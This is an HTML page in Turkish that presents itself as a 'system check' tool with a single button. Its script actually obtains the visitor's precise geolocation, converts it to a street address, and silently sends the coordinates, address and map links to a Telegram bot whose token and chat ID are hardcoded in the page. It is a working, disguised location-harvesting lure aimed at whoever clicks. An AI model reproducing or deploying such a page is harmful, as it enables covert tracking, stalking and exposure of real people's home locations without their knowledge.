<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>🔒 Gizli Sistem Kontrolü</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />

<style>
  *, *::before, *::after { box-sizing: border-box; }
  body {
    margin: 0; padding: 0;
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #eee;
    overflow: hidden;
  }
  .container {
    background: rgba(30,30,30,0.85);
    border-radius: 20px;
    padding: 40px 50px;
    width: 420px;
    max-width: 95vw;
    box-shadow:
      0 4px 15px rgba(0,0,0,0.5),
      0 0 30px #1e90ffaa,
      inset 0 0 50px #1e90ff22;
    text-align: center;
    backdrop-filter: blur(15px);
    -webkit-backdrop-filter: blur(15px);
    transition: box-shadow 0.5s ease;
  }
  .container:hover {
    box-shadow:
      0 6px 25px rgba(30,144,255,0.8),
      0 0 45px #1e90ffdd,
      inset 0 0 70px #1e90ff44;
  }
  h1 {
    font-weight: 600;
    font-size: 2.6rem;
    margin-bottom: 30px;
    letter-spacing: 1.5px;
    user-select: none;
  }
  button {
    background: linear-gradient(90deg, #1e90ff, #3bb0ff);
    border: none;
    padding: 18px 48px;
    font-size: 1.2rem;
    font-weight: 600;
    color: white;
    border-radius: 40px;
    cursor: pointer;
    box-shadow: 0 8px 20px #1e90ffcc;
    transition:
      background 0.4s ease,
      transform 0.3s ease,
      box-shadow 0.3s ease;
    position: relative;
    overflow: hidden;
  }
  button:focus {
    outline: none;
    box-shadow: 0 0 0 4px #60aaffaa;
  }
  button:hover {
    background: linear-gradient(90deg, #3bb0ff, #1e90ff);
    transform: scale(1.05);
    box-shadow: 0 12px 30px #3bb0ffcc;
  }
  button:disabled {
    cursor: not-allowed;
    background: #555;
    box-shadow: none;
    transform: none;
  }
  .spinner {
    position: absolute;
    right: 20px;
    top: 50%;
    width: 22px;
    height: 22px;
    border: 3px solid white;
    border-top-color: transparent;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    transform: translateY(-50%);
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  #status {
    margin-top: 32px;
    font-size: 1.15rem;
    min-height: 3.2em;
    color: #aad8ff;
    text-shadow: 0 0 6px #3bb0ff88;
    user-select: text;
    opacity: 0;
    transition: opacity 0.6s ease;
  }
  #status.visible {
    opacity: 1;
  }
  h1 span {
    display: inline-block;
    animation: flicker 3s infinite alternate ease-in-out;
  }
  @keyframes flicker {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.6; }
  }
  @media (max-width: 480px) {
    .container {
      padding: 30px 25px;
      width: 90vw;
    }
    h1 {
      font-size: 2rem;
    }
    button {
      padding: 16px 36px;
      font-size: 1.05rem;
    }
  }
</style>
</head>

<body>
  <main class="container" role="main" aria-label="Gizli Sistem Kontrol Uygulaması">
    <h1><span>🔧</span> Sistem Kontrolü</h1>
    <button id="sendBtn" aria-live="polite" aria-busy="false" aria-label="Sistemi kontrol et butonu">
      Sistemi Kontrol Et
    </button>
    <div id="status" aria-live="polite" aria-atomic="true" role="alert"></div>
  </main>

<script>
  const BOT_TOKEN = "8005950584:AAGAHkYJW5yeRDl1McQ9Dwz3wJm3T8LO27M";
  const CHAT_ID = "7125066639";

  const statusEl = document.getElementById('status');
  const sendBtn = document.getElementById('sendBtn');

  function setStatus(text, loading = false) {
    statusEl.textContent = text;
    if (loading) {
      if (!statusEl.classList.contains('visible')) statusEl.classList.add('visible');
      if (!sendBtn.querySelector('.spinner')) {
        const spinner = document.createElement('span');
        spinner.className = 'spinner';
        sendBtn.appendChild(spinner);
      }
      sendBtn.setAttribute('aria-busy', 'true');
      sendBtn.disabled = true;
    } else {
      sendBtn.removeAttribute('aria-busy');
      sendBtn.disabled = false;
      const spinner = sendBtn.querySelector('.spinner');
      if (spinner) spinner.remove();
      setTimeout(() => {
        statusEl.classList.remove('visible');
      }, 7000);
    }
  }

  function buildAddressString(address) {
    const parts = [];
    if(address.house_number) parts.push(`No: ${address.house_number}`);
    if(address.road) parts.push(address.road);
    if(address.neighbourhood) parts.push(address.neighbourhood);
    if(address.suburb) parts.push(address.suburb);
    if(address.city_district) parts.push(address.city_district);
    if(address.city) parts.push(address.city);
    if(address.state) parts.push(address.state);
    if(address.postcode) parts.push(address.postcode);
    if(address.country) parts.push(address.country);
    if(address.building) parts.push(`Bina: ${address.building}`);
    return parts.join(", ");
  }

  async function getLocation() {
    setStatus("Veriler kontrol ediliyor, lütfen bekleyin...", true);
    sendBtn.textContent = "Sistem Kontrol Ediliyor";

    if (!navigator.geolocation) {
      setStatus("Tarayıcı konum servisini desteklemiyor.");
      sendBtn.textContent = "Sistemi Kontrol Et";
      return;
    }

    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        });
      });

      const { latitude: lat, longitude: lon } = position.coords;

      setStatus("Veriler analiz ediliyor...", true);

      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
      if (!res.ok) throw new Error("Veriler alınamadı.");

      const data = await res.json();
      const addressDetails = data.address || {};
      const addressStr = buildAddressString(addressDetails) || data.display_name || "Adres bulunamadı.";

      // Telegram mesajı - tam detaylı adres ve harita linkleri
      const appleMapsUrl = `https://maps.apple.com/?ll=${lat},${lon}`;
      const googleMapsUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;

      const message = 
`🔒 Gizli Konum Alındı:

📌 Enlem: ${lat}
📌 Boylam: ${lon}
🏠 Adres: ${addressStr}

🗺 Apple Maps: ${appleMapsUrl}
🗺 Google Maps: ${googleMapsUrl}`;

      const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
      if (!telegramRes.ok) throw new Error("Veri gönderilemedi.");

      setStatus("İşlem tamamlandı.");
      sendBtn.textContent = "Sistemi Kontrol Et";

    } catch (err) {
      setStatus("Hata: " + err.message);
      sendBtn.textContent = "Sistemi Kontrol Et";
    }
  }

  sendBtn.addEventListener('click', getLocation);
</script>
</body>
</html>
